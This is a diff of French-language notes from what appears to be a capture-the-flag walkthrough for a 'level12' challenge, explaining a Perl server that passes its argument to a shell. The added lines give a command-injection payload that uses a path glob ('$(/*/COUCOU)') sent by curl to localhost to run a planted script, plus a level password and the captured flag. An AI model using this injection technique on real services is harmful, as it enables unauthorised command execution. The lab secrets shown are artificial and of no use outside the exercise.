@@ -205,10 +205,22 @@ su level12:fa6v5ateaw21peobuub8ipe6s
 
 le fichier perl 
 un serveur prend deux argument un x un y 
-l'argument x est uppercase puis suprimme si il y a un espace
+l'argument x est uppercase puis suprimme tout si il y a un espace
 puis ensuite on fait un egrep "^x" /tmp/xd
+mais surtout il execute la commande shell
 
-donc l'argument x doit match le contenu du fichier /tmp/xd
+donc si on lui envoie l'adresse d'un fichier qui contient un script et qu'il l'execute on est bon
+
+donc on peut faire mettre 
+```
+cat /tmp/COUCOU
+#!/bin/bash
+
+getflag > /tmp/ccc
+```
+puis faire  `echo $(curl -s "http://localhost:4646?x='\$(/*/COUCOU)'") ; cat /tmp/ccc`
+on obtient g1qKMiRpXf53AWhDaU7FEkczr
+
 
 
 
